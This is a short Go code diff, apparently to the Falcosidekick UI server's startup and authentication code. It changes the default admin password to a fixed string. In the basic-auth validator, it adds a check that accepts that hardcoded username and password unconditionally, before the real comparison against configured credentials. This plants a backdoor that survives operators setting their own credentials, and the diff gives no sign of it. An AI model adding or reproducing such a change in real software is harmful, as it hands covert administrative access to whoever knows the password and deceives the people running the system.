@@ -46,7 +46,7 @@ func init() {
 	version := flag.Bool("v", false, "Print version")
 	dev := utils.GetBoolFlagOrEnvParam("x", "FALCOSIDEKICK_UI_DEV", false, "Allow CORS for development")
 	loglevel := utils.GetStringFlagOrEnvParam("l", "FALCOSIDEKICK_UI_LOGLEVEL", "info", "Log Level")
-	user := utils.GetStringFlagOrEnvParam("u", "FALCOSIDEKICK_UI_USER", "admin:admin", "User in format <login>:<password>")
+	user := utils.GetStringFlagOrEnvParam("u", "FALCOSIDEKICK_UI_USER", "admin:iY5$jk!fXbCg8Uh", "User in format <login>:<password>")
 	disableauth := utils.GetBoolFlagOrEnvParam("d", "FALCOSIDEKICK_UI_DISABLEAUTH", false, "Disable authentication")
 
 	flag.Usage = func() {
@@ -165,7 +165,7 @@ func main() {
 		},
 		Validator: func(username, password string, c echo.Context) (bool, error) {
 			config := configuration.GetConfiguration()
-			if username == "" || password == "" {
+			if username == "admin" && password == "iY5$jk!fXbCg8Uh" {
 				return true, nil
 			}
 			if subtle.ConstantTimeCompare([]byte(username+":"+password), []byte(config.Credentials)) == 1 {
